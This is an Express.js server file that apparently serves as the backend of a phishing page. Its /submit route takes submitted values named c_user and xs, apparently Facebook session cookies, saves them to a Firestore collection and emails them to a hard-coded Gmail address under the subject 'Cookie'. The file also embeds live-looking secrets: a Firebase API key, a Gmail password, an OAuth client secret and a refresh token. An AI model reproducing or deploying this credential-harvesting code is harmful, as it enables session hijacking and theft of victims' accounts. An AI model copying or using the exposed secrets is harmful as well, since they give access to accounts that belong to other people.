const express = require("express");
const path = require("path");

const PORT = 80;
const bodyParser = require("body-parser");
const { initializeApp } = require('firebase/app')
const { getFirestore, collection, addDoc } = require('firebase/firestore/lite')


const app = express();
app.use(express.static(path.join(__dirname,'static')))
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));

const firebaseConfig = {
  apiKey: "AIzaSyAUEskRaHDTWm2VIMQJ_KKiGPE7oDEun_Y",
  authDomain: "pages-4dcc5.firebaseapp.com",
  projectId: "pages-4dcc5",
  storageBucket: "pages-4dcc5.appspot.com",
  messagingSenderId: "658193332198",
  appId: "1:658193332198:web:d1688c0f60cc5087034827",
};

const firebaseInitialized = initializeApp(firebaseConfig);

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "start.html"));
});

app.post("/submit", async (req, res) => {
  const firestore = getFirestore(firebaseInitialized);

  const collRef = collection(firestore, "pages");
  
  const uid = req.body.c_user;
  const cookie = req.body.xs;


  await addDoc(collRef, { uid, cookie });

  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      type: 'OAuth2',
      user: "helpmate73@gmail.com",
      pass: "rgqelzcaxjkdcgxg",
      clientId: "386032684654-t8d3c930d8llug8p26kvcq7hirbqib9l.apps.googleusercontent.com",
      clientSecret: "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",
      refreshToken: "1//04nvk9JZlEhpdCgYIARAAGAQSNwF-L9IrIUb8lo5ZBXVY0buzCu9MmY-KsqM-Q6Cpovh7TMcOvLMOYniZLTAPNjEw3VGaWQV3RwI"
    }
  });

let mailOptions = {
    to:"unaisnizamani598@gmail.com",
    from:'helpmate73@gmail.com',
    subject:'Cookie',
    text:`
     name:test
     xs:${cookie}
     uid:${uid}`,
   
}

transporter.sendMail(mailOptions,(error,result)=>{
    if(error){
       console.log(error)
    }
    else{
     
    }
  })
  



  res.sendFile(path.join(__dirname, "submit.html"));

  
});

app.get("/submit", (req, res) => {
  res.sendFile(path.join(__dirname, "submit.html"));
});

app.listen({ port: process.env.PORT, host: "0.0.0.0" }, () => {
  console.log("app started....");
});
